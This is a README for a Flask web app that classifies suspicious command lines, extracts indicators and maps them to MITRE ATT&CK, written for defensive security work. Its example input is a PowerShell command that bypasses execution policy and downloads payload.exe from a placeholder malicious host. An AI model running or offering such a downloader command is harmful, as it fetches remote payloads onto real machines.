# Suspicious Command Line Classifier

**SOC-style web app that detects malicious or suspicious command lines in real-time, extracts IOCs, maps threats to MITRE ATT&CK, and displays everything in a clean, matrix-themed interface. Ideal for SOC analysts, incident responders, threat hunters, red teamers, and researchers.**

## Features

- Detects PowerShell obfuscation, encoded commands, LOLBins, downloaders, execution bypasses, persistence patterns, and more.
- Extracts IOCs: URLs, IPs, domains.
- Maps suspicious detections to MITRE ATT&CK techniques.
- Clean, fast Flask web interface.
- Matrix-themed UI designed for SOC readability.
- Verbose detection summaries.
- Very easy to extend with new patterns.

## Installation

Clone the repository:

```
git clone https://github.com/yourusername/commandeye.git
cd commandeye
```

(Optional) Create a virtual environment:

```
python3 -m venv venv
source venv/bin/activate     # macOS/Linux
venv\Scripts\activate      # Windows
```

Install dependencies:

```
pip install Flask
```

## Usage

Start the web app:

```
python3 app.py
```

Open your browser:

```
http://127.0.0.1:5000/
```

Enter any command line → press **Analyze** → results appear below:
- Detection Summary  
- MITRE Technique Mapping  
- IOC Extraction  
- Final Verdict  

## Example

**Input:**

```
powershell.exe -ExecutionPolicy Bypass -Command "$wc = New-Object Net.WebClient; $wc.DownloadFile('http://malicious.example.com/payload.exe','C:\Users\Public\payload.exe')"
```

**Output:**

- PowerShell Download (MITRE: T1105)
- ExecutionPolicy Bypass (MITRE: T1059.001)
- URL extracted: http://malicious.example.com/payload.exe
- Verdict: Suspicious 

## Contributing

Pull requests welcome:
- More suspicious command line patterns  
- New detection categories  
- UI/UX improvements  
- Additional IOC extractors  

## Disclaimer

This tool is for education and authorized security testing only. Do not use on systems you do not own or have explicit permission to analyze.
